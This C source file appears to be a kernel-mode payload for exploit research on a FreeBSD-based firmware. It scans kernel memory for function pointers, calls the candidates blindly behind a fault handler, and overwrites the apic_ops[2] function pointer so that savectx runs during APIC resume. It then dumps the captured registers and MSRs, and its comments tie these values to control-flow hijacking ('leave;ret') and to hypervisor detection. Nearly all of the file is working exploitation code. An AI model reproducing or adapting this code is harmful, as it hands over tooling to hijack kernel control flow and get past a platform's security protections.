#include <stdint.h>

/*
 * state_capture — FreeBSD source-guided savectx state capture
 *
 * Uses savectx (from cpu_switch.S) as apic_ops[2] replacement to dump
 * full CPU state during LAPIC resume. savectx takes RDI as PCB pointer,
 * saves ALL state (GPRs, CRs, DRs, MSRs including LSTAR, GDT, IDT, TR),
 * and returns 1 — matching xapic_mode's expected return value.
 *
 * Mode (via fw_ver):
 *   0x4:   VERIFY — call savectx locally with controlled RDI to map PCB layout
 *   0x403: LOCATE — find savectx offset via kdata scan + local call verification
 *   0x2:   ARM    — point apic_ops[2] at savectx, save LSTAR/CR3 fingerprints
 *   0x3:   READBACK — scan kdata for PCB dump after resume, report full state
 *
 * Output layout (uint64_t indices):
 *
 * Shared header:
 *   [0]   magic "SCAP" (0x53434150) | status(32)
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   mode-specific
 *
 * Mode 0x4 (VERIFY — 64 slots):
 *   [3]   savectx_candidate (ktext address we're testing)
 *   [4]   pcb_buf address (kdata+0x400)
 *   [5]   pcb_bytes_used (how much savectx wrote)
 *   [6]   verified_lstar (from PCB dump)
 *   [7]   verified_cr3
 *   [8]   actual_lstar (from rdmsr)
 *   [9]   actual_cr3
 *   [10..41] raw PCB dump (32 qwords = 256 bytes from kdata+0x400)
 *   [50]  pcb_onfault_off (offset where onfault field was found)
 *   [63]  end marker
 *
 * Mode 0x403 (LOCATE — 140 slots):
 *   [3]   cpu_switch address
 *   [4]   scan_range_start
 *   [5]   scan_range_end
 *   [6]   hits_found
 *   [7]   best_savectx_candidate
 *   [8]   verification_status (0=untested, 1=verified, 2=failed)
 *   [10 + i*3 + 0]  kdata address where pointer was found
 *   [10 + i*3 + 1]  pointer value (ktext address)
 *   [10 + i*3 + 2]  offset from cpu_switch
 *   [131] end marker
 *
 * Mode 0x2 (ARM — 64 slots):
 *   [3]   savectx address (what we set apic_ops[2] to)
 *   [4]   original apic_ops[2]
 *   [5]   fingerprint_lstar (current LSTAR, saved for READBACK matching)
 *   [6]   fingerprint_cr3 (current CR3)
 *   [7]   sentinel address (kdata+0x100)
 *   [8]   sentinel value written
 *   [9]   apic_ops[2] readback (verify write)
 *   [63]  end marker
 *
 * Mode 0x3 (READBACK — 288 slots):
 *   [3]   sentinel readback
 *   [4]   sentinel survived? (1/0)
 *   [5]   current apic_ops[2]
 *   [6]   fingerprint_lstar (from kdata+0x200)
 *   [7]   fingerprint_cr3
 *   [8]   pcb_found? (1/0)
 *   [9]   pcb_found_address
 *   [10]  scan_range_checked
 *   --- If PCB found ---
 *   [20]  pcb_rip (return address = WHO called xapic_mode)
 *   [21]  pcb_rsp (stack pointer at call)
 *   [22]  pcb_rbp (KEY: if kdata range, leave;ret works)
 *   [23]  pcb_rbx
 *   [24]  pcb_r12
 *   [25]  pcb_r13
 *   [26]  pcb_r14
 *   [27]  pcb_r15
 *   [28]  pcb_cr0 (WP bit = HV active indicator)
 *   [29]  pcb_cr2
 *   [30]  pcb_cr3
 *   [31]  pcb_cr4
 *   [32]  pcb_dr0
 *   [33]  pcb_dr1
 *   [34]  pcb_dr2
 *   [35]  pcb_dr3
 *   [36]  pcb_dr6
 *   [37]  pcb_dr7
 *   [38..42] pcb_gdt, pcb_idt, pcb_ldt, pcb_tr (raw bytes)
 *   [50]  pcb_lstar (THE key value)
 *   [51]  pcb_cstar
 *   [52]  pcb_star
 *   [53]  pcb_sfmask
 *   [54]  pcb_efer
 *   [55]  pcb_fsbase
 *   [56]  pcb_gsbase
 *   [57]  pcb_kgsbase
 *   [60]  restored apic_ops[2]
 *   [287] end marker
 */

#define MAGIC_SCAP       0x53434150  /* "SCAP" */
#define MSR_LSTAR        0xC0000082
#define LSTAR_OFFSET     0x294218

/* FW 4.03 offsets */
#define APIC_OPS_OFF_KTEXT   0x1934AC8
#define CPU_SWITCH_OFF       (-0x9d6f80)

/* kdata regions */
#define SENTINEL_OFF     0x100
#define FINGERPRINT_OFF  0x200
#define PCB_BUF_OFF      0x400

#define SENTINEL_VAL     0x5356435854455354ULL  /* "SVCTXEST" */

/* PCB field offsets (FreeBSD 9.0 struct pcb from machine/pcb.h) */
#define PCB_R15          0x00
#define PCB_R14          0x08
#define PCB_R13          0x10
#define PCB_R12          0x18
#define PCB_RBP          0x20
#define PCB_RSP          0x28
#define PCB_RBX          0x30
#define PCB_RIP          0x38
#define PCB_FSBASE       0x40
#define PCB_GSBASE       0x48
#define PCB_KGSBASE      0x50
#define PCB_CR0          0x58
#define PCB_CR2          0x60
#define PCB_CR3          0x68
#define PCB_CR4          0x70
#define PCB_DR0          0x78
#define PCB_DR1          0x80
#define PCB_DR2          0x88
#define PCB_DR3          0x90
#define PCB_DR6          0x98
#define PCB_DR7          0xA0
#define PCB_GDT          0xA8
#define PCB_IDT          0xB2
#define PCB_LDT          0xBC
#define PCB_TR           0xC6

/* Estimated MSR offsets for FreeBSD 11+ (after pcb_tr + padding + pcb_flags etc.)
 * These will be determined precisely by Mode 0x4 VERIFY.
 * Starting guess: the MSR fields EFER/STAR/LSTAR/CSTAR/SF_MASK
 * were added after the existing fields in later FreeBSD versions. */
#define PCB_SEARCH_SIZE  0x200  /* scan this many bytes for LSTAR pattern */

#define MAX_HITS         40
#define MIN_KERN_ADDR    0xFFFF800000000000ULL
#define TD_PCB           0x3f8
#define PCB_ONFAULT      0x108

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read_cr3(void)
{
    uint64_t val;
    __asm__ volatile("movq %%cr3, %0" : "=r"(val));
    return val;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t *)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t *)addr = val;
}

static inline uint16_t read2(uint64_t addr)
{
    return *(volatile uint16_t *)addr;
}

/*
 * Call a function pointer with RDI = arg, using pcb_onfault for recovery.
 * Returns the function's RAX return value, or 0xFAFA... on fault.
 */
static uint64_t safe_call_rdi(uint64_t func_addr, uint64_t rdi_arg, uint64_t onfault_addr)
{
    uint64_t result;
    /*
     * savectx clobbers callee-saved registers (rbx, rbp, r12-r15)
     * because it reads them to save into the PCB. We must save/restore
     * them manually around the call since gcc won't allow clobbering them.
     */
    __asm__ volatile(
        /* Save callee-saved regs */
        "pushq %%rbx\n\t"
        "pushq %%rbp\n\t"
        "pushq %%r12\n\t"
        "pushq %%r13\n\t"
        "pushq %%r14\n\t"
        "pushq %%r15\n\t"

        /* Arm pcb_onfault */
        "leaq 2f(%%rip), %%rcx\n\t"
        "movq %%rcx, (%[onfault])\n\t"

        /* Call the function with RDI = our argument */
        "movq %[rdi_arg], %%rdi\n\t"
        "callq *%[func]\n\t"

        /* Normal return path */
        "movq %%rax, %[result]\n\t"
        "movq $0, (%[onfault])\n\t"
        "jmp 1f\n\t"

        /* Fault recovery */
        "2:\n\t"
        "addq $8, %%rsp\n\t"
        "movabsq $0xFAFAFAFAFAFAFAFA, %[result]\n\t"
        "movq $0, (%[onfault])\n\t"

        "1:\n\t"
        /* Restore callee-saved regs */
        "popq %%r15\n\t"
        "popq %%r14\n\t"
        "popq %%r13\n\t"
        "popq %%r12\n\t"
        "popq %%rbp\n\t"
        "popq %%rbx\n\t"

        : [result] "=&r"(result)
        : [func] "r"(func_addr), [rdi_arg] "r"(rdi_arg), [onfault] "r"(onfault_addr)
        : "rax", "rcx", "rdx", "rsi", "rdi",
          "r8", "r9", "r10", "r11",
          "memory", "cc"
    );
    return result;
}

int module_start(kproc_args *args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t mode = args->fw_ver;
    volatile uint64_t *out = (volatile uint64_t *)args;
    volatile uint32_t *out32 = (volatile uint32_t *)args;

    uint64_t lstar = rdmsr(MSR_LSTAR);
    uint64_t ktext_base = lstar - LSTAR_OFFSET;
    uint64_t cr3 = read_cr3();

    if (mode == 0x4) {
        /* ============================================================
         * MODE 0x4: VERIFY — Call savectx locally to map PCB layout
         *
         * We call savectx with RDI pointing to a buffer in kdata.
         * This runs during normal operation (no NPT NX issues).
         * The saved state tells us the exact PCB field layout for
         * this firmware version.
         * ============================================================ */
        for (int i = 0; i < 64; i++) out[i] = 0;

        out[1] = kdata_base;
        out[2] = ktext_base;
        out[8] = lstar;  /* actual LSTAR for comparison */
        out[9] = cr3;    /* actual CR3 for comparison */

        /* Get curthread → td_pcb → onfault_addr */
        uint64_t curthread;
        __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
        uint64_t td_pcb = read8(curthread + TD_PCB);
        if (!td_pcb) {
            out32[0] = MAGIC_SCAP;
            out32[1] = 0x00FF;
            out[63] = 0xdeadbeefcafe0040ULL;
            return 0;
        }
        uint64_t onfault_addr = td_pcb + PCB_ONFAULT;

        /* Clear the PCB buffer in kdata */
        uint64_t pcb_buf = kdata_base + PCB_BUF_OFF;
        for (int i = 0; i < PCB_SEARCH_SIZE / 8; i++)
            write8(pcb_buf + i * 8, 0);

        out[4] = pcb_buf;

        /* Find savectx candidate.
         * Strategy: scan kdata for pointers in [cpu_switch, cpu_switch+0x2000]
         * that could be savectx (same compilation unit). */
        uint64_t cpu_switch = kdata_base + (int64_t)CPU_SWITCH_OFF;
        uint64_t scan_lo = cpu_switch;
        uint64_t scan_hi = cpu_switch + 0x2000;

        /* First, try calling each candidate:
         * savectx returns 1 AND writes CR3 to PCB_CR3(rdi)=offset 0x68 */
        uint64_t best_candidate = 0;

        /* Scan pcpu area for function pointers near cpu_switch */
        for (uint64_t addr = kdata_base + 0x6400000;
             addr < kdata_base + 0x6600000 && !best_candidate;
             addr += 8) {
            uint64_t val = read8(addr);
            if (val >= scan_lo && val < scan_hi) {
                /* Clear buffer before each attempt */
                for (int i = 0; i < PCB_SEARCH_SIZE / 8; i++)
                    write8(pcb_buf + i * 8, 0);

                /* Try calling this candidate as savectx(pcb_buf) */
                uint64_t ret = safe_call_rdi(val, pcb_buf, onfault_addr);

                if (ret == 1) {
                    /* savectx returns 1. Check if CR3 was written. */
                    uint64_t saved_cr3 = read8(pcb_buf + PCB_CR3);
                    if (saved_cr3 == cr3) {
                        /* Confirmed: this is savectx */
                        best_candidate = val;
                    }
                }
            }
        }

        /* Also scan low kdata (near sysent/sysentvec) */
        if (!best_candidate) {
            for (uint64_t addr = kdata_base;
                 addr < kdata_base + 0x200000 && !best_candidate;
                 addr += 8) {
                uint64_t val = read8(addr);
                if (val >= scan_lo && val < scan_hi) {
                    for (int i = 0; i < PCB_SEARCH_SIZE / 8; i++)
                        write8(pcb_buf + i * 8, 0);

                    uint64_t ret = safe_call_rdi(val, pcb_buf, onfault_addr);
                    if (ret == 1) {
                        uint64_t saved_cr3 = read8(pcb_buf + PCB_CR3);
                        if (saved_cr3 == cr3) {
                            best_candidate = val;
                        }
                    }
                }
            }
        }

        out[3] = best_candidate;

        if (!best_candidate) {
            out32[0] = MAGIC_SCAP;
            out32[1] = 0x00FD;  /* savectx not found */
            out[63] = 0xdeadbeefcafe0040ULL;
            return 0;
        }

        /* Re-run savectx with fresh buffer to get clean dump */
        for (int i = 0; i < PCB_SEARCH_SIZE / 8; i++)
            write8(pcb_buf + i * 8, 0);

        uint64_t ret = safe_call_rdi(best_candidate, pcb_buf, onfault_addr);
        out[5] = ret;  /* should be 1 */

        /* Read back the PCB dump — 32 qwords (256 bytes) */
        for (int i = 0; i < 32; i++)
            out[10 + i] = read8(pcb_buf + i * 8);

        /* Identify LSTAR location in the PCB.
         * Scan the dump for the current LSTAR value. */
        uint64_t lstar_off = 0;
        for (uint64_t off = 0; off < PCB_SEARCH_SIZE; off += 8) {
            if (read8(pcb_buf + off) == lstar) {
                lstar_off = off;
                break;
            }
        }

        out[6] = (lstar_off != 0) ? read8(pcb_buf + lstar_off) : 0;  /* verified LSTAR */
        out[7] = read8(pcb_buf + PCB_CR3);  /* verified CR3 */

        /* Report the LSTAR offset within the PCB */
        out[50] = lstar_off;

        out32[0] = MAGIC_SCAP;
        out32[1] = 0x0004;  /* mode 4 complete */
        out[63] = 0xdeadbeefcafe0040ULL;
        return 0;
    }

    if (mode == 0x403) {
        /* ============================================================
         * MODE 0x403: LOCATE — Find savectx address
         *
         * Scan kdata for pointers near cpu_switch, verify each candidate
         * by calling it with a controlled PCB buffer.
         * ============================================================ */
        for (int i = 0; i < 140; i++) out[i] = 0;

        uint64_t cpu_switch = kdata_base + (int64_t)CPU_SWITCH_OFF;
        uint64_t scan_lo = cpu_switch;
        uint64_t scan_hi = cpu_switch + 0x2000;

        out[1] = kdata_base;
        out[2] = ktext_base;
        out[3] = cpu_switch;
        out[4] = scan_lo;
        out[5] = scan_hi;

        /* Write magic early */
        out32[1] = 0x0103;
        __asm__ volatile("mfence" ::: "memory");
        out32[0] = MAGIC_SCAP;

        uint32_t hits = 0;

        /* Region 1: pcpu/IDT area */
        for (uint64_t addr = kdata_base + 0x6400000;
             addr < kdata_base + 0x6600000 && hits < MAX_HITS;
             addr += 8) {
            uint64_t val = read8(addr);
            if (val >= scan_lo && val < scan_hi) {
                out[10 + hits * 3 + 0] = addr;
                out[10 + hits * 3 + 1] = val;
                out[10 + hits * 3 + 2] = val - cpu_switch;
                hits++;
            }
        }

        /* Region 2: low kdata */
        for (uint64_t addr = kdata_base;
             addr < kdata_base + 0x200000 && hits < MAX_HITS;
             addr += 8) {
            uint64_t val = read8(addr);
            if (val >= scan_lo && val < scan_hi) {
                out[10 + hits * 3 + 0] = addr;
                out[10 + hits * 3 + 1] = val;
                out[10 + hits * 3 + 2] = val - cpu_switch;
                hits++;
            }
        }

        /* Region 3: around sysent/sysentvec */
        for (uint64_t addr = kdata_base + 0xD00000;
             addr < kdata_base + 0xD20000 && hits < MAX_HITS;
             addr += 8) {
            uint64_t val = read8(addr);
            if (val >= scan_lo && val < scan_hi) {
                out[10 + hits * 3 + 0] = addr;
                out[10 + hits * 3 + 1] = val;
                out[10 + hits * 3 + 2] = val - cpu_switch;
                hits++;
            }
        }

        out[6] = hits;

        /* Try to verify which hit is savectx */
        uint64_t curthread;
        __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
        uint64_t td_pcb = read8(curthread + TD_PCB);
        uint64_t onfault_addr = td_pcb ? (td_pcb + PCB_ONFAULT) : 0;

        uint64_t best = 0;
        if (onfault_addr) {
            uint64_t pcb_buf = kdata_base + PCB_BUF_OFF;
            for (uint32_t h = 0; h < hits; h++) {
                uint64_t candidate = out[10 + h * 3 + 1];

                /* Clear buffer */
                for (int i = 0; i < PCB_SEARCH_SIZE / 8; i++)
                    write8(pcb_buf + i * 8, 0);

                uint64_t ret = safe_call_rdi(candidate, pcb_buf, onfault_addr);
                if (ret == 1) {
                    uint64_t saved_cr3 = read8(pcb_buf + PCB_CR3);
                    if (saved_cr3 == cr3) {
                        best = candidate;
                        break;
                    }
                }
            }
        }

        out[7] = best;
        out[8] = best ? 1 : 0;

        out32[1] = 0x1103;
        out[131] = 0xdeadbeefcafe0403ULL;
        return 0;
    }

    if (mode == 0x2) {
        /* ============================================================
         * MODE 0x2: ARM — Point apic_ops[2] at savectx
         *
         * 1. Find savectx (quick scan + verify)
         * 2. Save current LSTAR/CR3 as fingerprints to kdata+0x200
         * 3. Overwrite apic_ops[2] with savectx address
         * 4. Write sentinel to kdata+0x100
         * ============================================================ */
        for (int i = 0; i < 64; i++) out[i] = 0;

        out[1] = kdata_base;
        out[2] = ktext_base;

        uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_KTEXT;
        volatile uint64_t *apic_table = (volatile uint64_t *)apic_ops_addr;
        uint64_t original_xapic = apic_table[2];

        out[4] = original_xapic;

        /* Save fingerprints to kdata for READBACK */
        uint64_t fp_addr = kdata_base + FINGERPRINT_OFF;
        write8(fp_addr + 0, lstar);    /* fingerprint_lstar */
        write8(fp_addr + 8, cr3);      /* fingerprint_cr3 */
        write8(fp_addr + 16, original_xapic);  /* original xapic_mode */

        out[5] = lstar;
        out[6] = cr3;

        /* Find savectx via quick scan */
        uint64_t cpu_switch = kdata_base + (int64_t)CPU_SWITCH_OFF;
        uint64_t scan_lo = cpu_switch;
        uint64_t scan_hi = cpu_switch + 0x2000;

        uint64_t curthread;
        __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
        uint64_t td_pcb = read8(curthread + TD_PCB);
        uint64_t onfault_addr = td_pcb ? (td_pcb + PCB_ONFAULT) : 0;

        uint64_t savectx_addr = 0;
        if (onfault_addr) {
            uint64_t pcb_buf = kdata_base + PCB_BUF_OFF;
            for (uint64_t addr = kdata_base + 0x6400000;
                 addr < kdata_base + 0x6600000 && !savectx_addr;
                 addr += 8) {
                uint64_t val = read8(addr);
                if (val >= scan_lo && val < scan_hi) {
                    for (int i = 0; i < PCB_SEARCH_SIZE / 8; i++)
                        write8(pcb_buf + i * 8, 0);

                    uint64_t ret = safe_call_rdi(val, pcb_buf, onfault_addr);
                    if (ret == 1 && read8(pcb_buf + PCB_CR3) == cr3) {
                        savectx_addr = val;
                    }
                }
            }
            /* Also check low kdata */
            if (!savectx_addr) {
                for (uint64_t addr = kdata_base;
                     addr < kdata_base + 0x200000 && !savectx_addr;
                     addr += 8) {
                    uint64_t val = read8(addr);
                    if (val >= scan_lo && val < scan_hi) {
                        for (int i = 0; i < PCB_SEARCH_SIZE / 8; i++)
                            write8(pcb_buf + i * 8, 0);

                        uint64_t ret = safe_call_rdi(val, pcb_buf, onfault_addr);
                        if (ret == 1 && read8(pcb_buf + PCB_CR3) == cr3) {
                            savectx_addr = val;
                        }
                    }
                }
            }
        }

        if (!savectx_addr) {
            out[3] = 0;
            out32[0] = MAGIC_SCAP;
            out32[1] = 0x00FD;  /* savectx not found */
            out[63] = 0xdeadbeefcafe0020ULL;
            return 0;
        }

        out[3] = savectx_addr;

        /* Write sentinel */
        uint64_t sentinel_addr = kdata_base + SENTINEL_OFF;
        write8(sentinel_addr, SENTINEL_VAL);
        out[7] = sentinel_addr;
        out[8] = SENTINEL_VAL;

        /* ARM: overwrite apic_ops[2] with savectx */
        apic_table[2] = savectx_addr;

        /* Verify */
        out[9] = apic_table[2];
        if (apic_table[2] != savectx_addr) {
            apic_table[2] = original_xapic;
            out32[0] = MAGIC_SCAP;
            out32[1] = 0x00FE;  /* write failed */
            out[63] = 0xdeadbeefcafe0020ULL;
            return 0;
        }

        out32[0] = MAGIC_SCAP;
        out32[1] = 0x0002;  /* armed */
        out[63] = 0xdeadbeefcafe0020ULL;
        return 0;
    }

    if (mode == 0x3) {
        /* ============================================================
         * MODE 0x3: READBACK — Scan kdata for savectx PCB dump
         *
         * After resume, savectx may have written CPU state somewhere
         * in kdata (wherever RDI pointed). We search for the fingerprint
         * pattern (LSTAR + CR3 at known PCB offsets).
         * ============================================================ */
        int readback_slots = 288;
        for (int i = 0; i < readback_slots; i++) out[i] = 0;

        out[1] = kdata_base;
        out[2] = ktext_base;

        /* Check sentinel */
        uint64_t sentinel = read8(kdata_base + SENTINEL_OFF);
        out[3] = sentinel;
        out[4] = (sentinel == SENTINEL_VAL) ? 1 : 0;

        /* Read current apic_ops[2] */
        uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_KTEXT;
        volatile uint64_t *apic_table = (volatile uint64_t *)apic_ops_addr;
        out[5] = apic_table[2];

        /* Read fingerprints saved by ARM mode */
        uint64_t fp_addr = kdata_base + FINGERPRINT_OFF;
        uint64_t fp_lstar = read8(fp_addr + 0);
        uint64_t fp_cr3 = read8(fp_addr + 8);
        uint64_t fp_orig_xapic = read8(fp_addr + 16);

        out[6] = fp_lstar;
        out[7] = fp_cr3;

        /* First, determine the LSTAR offset within PCB.
         * We call savectx locally to find it. */
        uint64_t curthread;
        __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
        uint64_t td_pcb = read8(curthread + TD_PCB);
        uint64_t onfault_addr = td_pcb ? (td_pcb + PCB_ONFAULT) : 0;

        uint64_t lstar_pcb_offset = 0;

        /* Quick savectx call to find LSTAR offset in PCB */
        if (onfault_addr) {
            uint64_t pcb_buf = kdata_base + PCB_BUF_OFF;
            uint64_t cpu_switch = kdata_base + (int64_t)CPU_SWITCH_OFF;
            uint64_t scan_lo = cpu_switch;
            uint64_t scan_hi = cpu_switch + 0x2000;

            /* Find savectx */
            uint64_t savectx_addr = 0;
            for (uint64_t addr = kdata_base + 0x6400000;
                 addr < kdata_base + 0x6600000 && !savectx_addr;
                 addr += 8) {
                uint64_t val = read8(addr);
                if (val >= scan_lo && val < scan_hi) {
                    for (int i = 0; i < PCB_SEARCH_SIZE / 8; i++)
                        write8(pcb_buf + i * 8, 0);

                    uint64_t ret = safe_call_rdi(val, pcb_buf, onfault_addr);
                    if (ret == 1 && read8(pcb_buf + PCB_CR3) == cr3) {
                        savectx_addr = val;
                    }
                }
            }

            if (savectx_addr) {
                /* Find where LSTAR is stored in PCB */
                for (int i = 0; i < PCB_SEARCH_SIZE / 8; i++)
                    write8(pcb_buf + i * 8, 0);

                safe_call_rdi(savectx_addr, pcb_buf, onfault_addr);

                for (uint64_t off = 0; off < PCB_SEARCH_SIZE; off += 8) {
                    if (read8(pcb_buf + off) == lstar) {
                        lstar_pcb_offset = off;
                        break;
                    }
                }
            }
        }

        /* Scan kdata for PCB dump matching fingerprints.
         * Look for: [addr + PCB_CR3] == fp_cr3 AND [addr + lstar_pcb_offset] == fp_lstar
         * But LSTAR may have changed on reboot if KASLR re-randomized.
         * Use fp_lstar (saved pre-rest) for matching. */
        uint64_t pcb_found_addr = 0;
        uint64_t scan_total = 0;

        if (fp_cr3 && lstar_pcb_offset) {
            /* Scan: kdata_base to kdata_base + 0x7000000 */
            for (uint64_t base = kdata_base;
                 base < kdata_base + 0x7000000 && !pcb_found_addr;
                 base += 8) {
                scan_total++;
                /* Check CR3 at expected PCB offset */
                uint64_t maybe_cr3 = read8(base + PCB_CR3);
                if (maybe_cr3 == fp_cr3) {
                    /* Check LSTAR at discovered offset */
                    uint64_t maybe_lstar = read8(base + lstar_pcb_offset);
                    if (maybe_lstar == fp_lstar) {
                        /* Double check: CR0 should have PG and PE bits set */
                        uint64_t maybe_cr0 = read8(base + PCB_CR0);
                        if ((maybe_cr0 & 0x80000001ULL) == 0x80000001ULL) {
                            pcb_found_addr = base;
                        }
                    }
                }
            }
        }

        out[8] = pcb_found_addr ? 1 : 0;
        out[9] = pcb_found_addr;
        out[10] = scan_total;

        if (pcb_found_addr) {
            /* Read the full PCB state */
            out[20] = read8(pcb_found_addr + PCB_RIP);   /* return address = caller identity */
            out[21] = read8(pcb_found_addr + PCB_RSP);
            out[22] = read8(pcb_found_addr + PCB_RBP);   /* KEY for leave;ret */
            out[23] = read8(pcb_found_addr + PCB_RBX);
            out[24] = read8(pcb_found_addr + PCB_R12);
            out[25] = read8(pcb_found_addr + PCB_R13);
            out[26] = read8(pcb_found_addr + PCB_R14);
            out[27] = read8(pcb_found_addr + PCB_R15);

            out[28] = read8(pcb_found_addr + PCB_CR0);   /* WP bit check */
            out[29] = read8(pcb_found_addr + PCB_CR2);
            out[30] = read8(pcb_found_addr + PCB_CR3);
            out[31] = read8(pcb_found_addr + PCB_CR4);

            out[32] = read8(pcb_found_addr + PCB_DR0);
            out[33] = read8(pcb_found_addr + PCB_DR1);
            out[34] = read8(pcb_found_addr + PCB_DR2);
            out[35] = read8(pcb_found_addr + PCB_DR3);
            out[36] = read8(pcb_found_addr + PCB_DR6);
            out[37] = read8(pcb_found_addr + PCB_DR7);

            /* GDT/IDT/LDT/TR (raw bytes) */
            out[38] = read8(pcb_found_addr + PCB_GDT);      /* limit + base */
            out[39] = read8(pcb_found_addr + PCB_GDT + 8);
            out[40] = read8(pcb_found_addr + PCB_IDT);
            out[41] = read8(pcb_found_addr + PCB_IDT + 8);
            out[42] = read8(pcb_found_addr + PCB_TR);

            /* MSR fields at discovered offsets */
            out[50] = read8(pcb_found_addr + lstar_pcb_offset);  /* LSTAR */

            /* Search for other MSR values near LSTAR offset.
             * In FreeBSD savectx, the MSR save order is:
             * FSBASE, GSBASE, KGSBASE, EFER, STAR, LSTAR, CSTAR, SF_MASK
             * So LSTAR is at index 5 in the MSR sequence.
             * CSTAR = lstar_off + 8, SF_MASK = lstar_off + 16
             * STAR = lstar_off - 8, EFER = lstar_off - 16 */
            if (lstar_pcb_offset >= 16) {
                out[54] = read8(pcb_found_addr + lstar_pcb_offset - 16);  /* EFER (maybe) */
                out[52] = read8(pcb_found_addr + lstar_pcb_offset - 8);   /* STAR (maybe) */
            }
            out[51] = read8(pcb_found_addr + lstar_pcb_offset + 8);   /* CSTAR (maybe) */
            out[53] = read8(pcb_found_addr + lstar_pcb_offset + 16);  /* SF_MASK (maybe) */

            out[55] = read8(pcb_found_addr + PCB_FSBASE);
            out[56] = read8(pcb_found_addr + PCB_GSBASE);
            out[57] = read8(pcb_found_addr + PCB_KGSBASE);
        }

        /* Restore apic_ops[2] to original xapic_mode */
        if (fp_orig_xapic) {
            apic_table[2] = fp_orig_xapic;
            out[60] = apic_table[2];
        } else {
            /* Fallback: use set_tpr - 8 trick (proven in savectx_finder) */
            uint64_t set_tpr = apic_table[18];
            uint64_t orig_xapic = set_tpr - 8;
            apic_table[2] = orig_xapic;
            out[60] = orig_xapic;
        }

        out32[0] = MAGIC_SCAP;
        out32[1] = pcb_found_addr ? 0x1003 : 0x0003;
        out[287] = 0xdeadbeefcafe0030ULL;
        return 0;
    }

    /* Unknown mode */
    for (int i = 0; i < 64; i++) out[i] = 0;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out32[0] = MAGIC_SCAP;
    out32[1] = 0x00FF;
    out[63] = 0xdeadbeefcafe00FFULL;
    return 0;
}
